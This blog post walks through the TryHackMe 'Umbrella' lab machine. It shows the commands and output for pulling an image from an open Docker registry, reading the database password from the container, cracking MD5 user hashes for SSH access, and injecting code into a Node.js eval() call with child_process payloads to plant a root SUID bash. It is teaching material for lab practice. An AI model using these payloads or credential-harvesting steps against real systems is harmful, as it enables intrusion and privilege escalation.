---
title: CTF Walkthrough for TryHackMe Machine Umbrella
date: 2024-10-26 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-26-umbrella/box-umbrella.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Umbrella a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Umbrella<br>
Difficulty: Medium<br>
Operating System: Umbrella<br>
Machine link: [Umbrella](https://tryhackme.com/r/room/umbrella)<br>
### Tools used
1) Nmap<br>
2) Hashcat<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate the services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Umbrella/Scans/Service]
└─$ nmap -n -sC -sV 10.10.143.85 -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 12:47 BST
Nmap scan report for 10.10.143.85
Host is up (0.097s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
|   256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
|_  256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
3306/tcp  open     mysql       MySQL 5.7.40
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 5
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, FoundRows, ConnectWithDatabase, Speaks41ProtocolOld, SupportsCompression, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, LongColumnFlag, IgnoreSpaceBeforeParenthesis, ODBCClient, LongPassword, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: )xK\x12\x07\x7F@%U0\x1B\x18\x18%\x1Cb/\x1FE\x05
|_  Auth Plugin Name: mysql_native_password
5000/tcp  open     http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp  open     http        Node.js (Express middleware)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login
32769/tcp filtered filenet-rpc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.06 seconds
```

We see that the target runs SSH, MySQL, Docker Registry, and NodeJS services. It also has one filtered port. Since we don't have any credentials, let's skip SSH and MySQL for now. We can test the Docker Registry to see if it is protected by HTTP basic authentication.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Umbrella]
└─$ curl -k 10.10.143.85:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]} 
```

## Exploitation

We see that the Docker Registry is not protected and can be accessed by anyone. We also see that it contains the image of a container. Let's pull this container to our attack host.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Umbrella/Misc File]
└─$ sudo docker  pull 10.10.143.85:5000/umbrella/timetracking
Using default tag: latest
latest: Pulling from umbrella/timetracking
3f4ca61aafcd: Pull complete
00fde01815c9: Pull complete
a3241ece5841: Pull complete
f897be510228: Pull complete
23e2f216e824: Pull complete
15b79dac86ef: Pull complete
7fbf137cf91f: Pull complete
e5e56a29478c: Pull complete
82f3f98b46d4: Pull complete
62c454461c50: Pull complete
c9124d8ccff2: Pull complete
Digest: sha256:ecac8ce90b50026feea9d5552ac2889f6e8b2201f35e0ac5c21caeafed6fb9af
Status: Downloaded newer image for 10.10.143.85:5000/umbrella/timetracking:latest
10.10.143.85:5000/umbrella/timetracking:latest

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Umbrella/Misc File]
└─$ sudo docker images
REPOSITORY                                TAG       IMAGE ID       CREATED         SIZE
10.10.143.85:5000/umbrella/timetracking   latest    7843f102a2fc   22 months ago   255MB
```

Once we pull the container we can run it to obtain a shell in it.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Umbrella/Misc File]
└─$ sudo docker run -it 10.10.143.85:5000/umbrella/timetracking  bash
root@5dfa2a52d55a:/usr/src/app# ls
app.js  node_modules  package-lock.json  package.json  public  views
root@5dfa2a52d55a:/usr/src/app# cat app.js14:23:27 [78/78]
const mysql = require('mysql');                   
const express = require('express');
const session = require('express-session');
const path = require('path');    
const crypto = require('crypto')
const cookieParser = require('cookie-parser');      
const fs = require('fs');

const connection = mysql.createConnection({         
        host     : process.env.DB_HOST,
        user     : process.env.DB_USER,             
        password : process.env.DB_PASS,
        database : process.env.DB_DATABASE
});
<SNIP>
```

We see that in the `app.js` file, the database password is read from the environment variables of the container. We can check this with the `env` command.
```bash
root@5dfa2a52d55a:/usr/src/app# env
HOSTNAME=5dfa2a52d55a
YARN_VERSION=1.22.19
PWD=/usr/src/app
DB_USER=root
<SNIP>
NODE_VERSION=19.3.0
DB_DATABASE=timetracking
DB_PASS=<REDACTED>
_=/usr/bin/env
OLDPWD=/     
```

Once we have the database password we can connect to it and enumerate its content.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Umbrella]
└─$ mysql -h 10.10.143.85 -u root -p --skip-ssl
Enter password:                                
<SNIP>

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.323 sec)                                                                                             
MySQL [(none)]> use timetracking
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed                                                                              
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |     
+------------------------+                     
| users                  |                
+------------------------+
1 row in set (0.098 sec)                                                                                 
MySQL [timetracking]> DESC users;
+-------+-------------+------+-----+---------+-------+
| Field | Type        | Null | Key | Default | Extra |
+-------+-------------+------+-----+---------+-------+
| user  | varchar(10) | YES  |     | NULL    |       |
| pass  | varchar(32) | YES  |     | NULL    |       |
| time  | int(11)     | YES  |     | NULL    |       |                                                                                 
+-------+-------------+------+-----+---------+-------+
3 rows in set (0.622 sec)                                                                                             
MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7xxxxxxxxxxxxxxx898e549b63 |   360 |
| chris-r  | 0d107d0xxxxxxxxxxxxxxx5c71e9e9b7 |   420 |
| jill-v   | d5c0607xxxxxxxxxxxxxxx2a83992ac8 |   564 |
| barry-b  | 4a04890xxxxxxxxxxxxxxxace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.433 sec)                                          

MySQL [timetracking]>  
```

We can identify a table containing usernames and password hashes. These hashes look like MD5 hash so let's copy them into a file and crack them.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Umbrella/Misc File]
└─$ hashcat -m 0 -a 0 hashes.txt .rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
d5c0607xxxxxxxxxxxxxxx2a83992ac8:<REDACTED>                
0d107d0xxxxxxxxxxxxxxx5c71e9e9b7:<REDACTED>                  
2ac9cb7xxxxxxxxxxxxxxx898e549b63:<REDACTED>                
4a04890xxxxxxxxxxxxxxxace5d7e994:<REDACTED>                 
                                                          
<SNIP>
Candidates.#1....: total90 -> cocoliso
Hardware.Mon.#1..: Temp: 33c Util: 19%

Started: Fri Oct 25 16:14:17 2024
Stopped: Fri Oct 25 16:14:20 2024
```

We successfully cracked the four hashes. Now that we have a list of usernames and passwords, we can attempt to log in using SSH.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Umbrella]
└─$ ssh claire-r@10.10.143.85     
The authenticity of host '10.10.143.85 (10.10.143.85)' can't be established.
<SNIP>
claire-r@ctf:~$ ls
timeTracker-src  user.txt
```

We can see that the user claire-r can log into the target using the same password. We can use this access to read the user flag.

## Post Exploitation

Notice the `timeTracker-src` directory in the user's home directory. We can see that the files in this directory are quite similar to the ones in the root directory of the docker container we downloaded. This might be the root directory of the container running.
```bash
claire-r@ctf:~$ ls 
timeTracker-src  user.txt
claire-r@ctf:~$ ls timeTracker-src/
app.js  db  docker-compose.yml  Dockerfile  logs  package.json  package-lock.json  public  views
```

We can read through the code in the  `app.js` file.
```js
// http://localhost:8080/time
app.post('/time', function(request, response) {
    if (request.session.loggedin && request.session.username) {
        let timeCalc = parseInt(eval(request.body.time));
                let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

                connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
                        if (error) {
                                log(error, "error")
                        };
                        log(`${username} added ${time} minutes.`, "info")
                        response.redirect('/');
                });
        } else {
        response.redirect('/');;
    }
});
```

We will notice that the `time` endpoint uses the eval() on the value of the POST parameter. This value is not validated hence we can send any valid JavaScript code and it will be executed. Let's visit the NodeJS application running on port 8080 we enumerated earlier and log into the web application.
![](/assets/img/posts/walthrough/tryhackme/2024-10-26-umbrella/1-browse.png)
![](/assets/img/posts/walthrough/tryhackme/2024-10-26-umbrella/after-login.png)

We can see the input field where we can enter the input that will be evaluated by the `eval()` function. If we enter the payload `require('child_process').exec('touch /log/test')` and check the `/home/claire-r/timeTracker-src/logs/` we will see that the file test is created and belongs to the root user.
```bash
claire-r@ctf:~/timeTracker-src$ ls -l logs/ 
total 4
-rw-r--r-- 1 root root    0 Oct 25 15:24 test
-rw-r--r-- 1 root root 2571 Oct 25 15:24 tt.log
```

Now that we have code execution on the target, we can copy the bash binary to the `timeTracker-src/logs/` directory we have write access to, change the ownership to root, and set the SUID bit on it. Let's first copy the binary to the `/home/claire-r/timeTracker-src/logs/` directory.
```bash
claire-r@ctf:~/timeTracker-src$ cp /usr/bin/bash logs/
```

We can now send the payload `require('child_process').exec('chown root:root /logs/bash')` to change the ownership to root.
```bash
claire-r@ctf:~/timeTracker-src$ ls -l logs/
total 1160
-rwxr-xr-x 1 root root 1183448 Oct 25 15:28 bash
-rw-r--r-- 1 root root       0 Oct 25 15:24 test
-rw-r--r-- 1 root root    2635 Oct 25 15:29 tt.log
```

Finally, we can set the SUID bit on this binary by sending the payload `require('child_process').exec('chmod +s  /logs/bash')`. 
```bash
claire-r@ctf:~/timeTracker-src$ ls -l logs/
total 1160
-rwsr-sr-x 1 root root 1183448 Oct 25 15:28 bash
-rw-r--r-- 1 root root       0 Oct 25 15:24 test
-rw-r--r-- 1 root root    2667 Oct 25 15:30 tt.log
```

Now that we have the SUID bit set on this binary, we can obtain a shell as the root user and read the second flag.
```bash
claire-r@ctf:~/timeTracker-src$ ./logs/bash  -p
bash-5.0# whoami
root
bash-5.0# ls /root
root.txt  snap
```

## Conclusion

Congratulations! In this walkthrough, you have an open Docker Registry service to download a docker container and enumerate the database password that you used to connect to the database and dump users' credentials. Finally, you obtained root access by exploiting the used of the `eval()` function used in the NodeJS application. This machine was designed to show how keeping open services and the use of dangerous functions on user's input without proper input validation could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
